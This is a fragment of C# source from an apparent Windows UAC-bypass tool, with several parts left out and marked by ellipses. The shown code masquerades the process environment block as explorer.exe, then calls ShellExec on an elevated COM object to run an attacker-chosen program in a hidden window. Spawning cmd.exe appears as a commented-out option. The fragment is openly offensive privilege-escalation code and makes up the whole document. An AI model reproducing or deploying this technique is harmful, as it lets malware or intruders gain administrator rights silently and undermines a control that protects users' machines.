...
using static BypassUAC_csharp.PEBMasq;
//using System.Windows.Forms;
...
namespace BypassUAC_Dll_csharp
{
    public class BypassUAC_Dll_csharp
    {
        ...
        static void Main(string[] args)
        {
            if(args.Length < 1)
            {
                Console.WriteLine("[-] Need exe path");
                return;
            }
            ...
            if (!BypassUAC_csharp.PEBMasq.MasqueradePEB(@"C:\Windows\explorer.exe"))
            {
            ...
            //icm.ShellExec(@"C:\windows\system32\cmd.exe", null, null, SEE_MASK_DEFAULT, 0);
            string[] args_temp = new string[args.Length - 1];
            Array.Copy(args, 1, args_temp, 0, args.Length-1);
            icm.ShellExec(args[0], String.Join(" ", args_temp), null, SEE_MASK_DEFAULT, SW_HIDE);
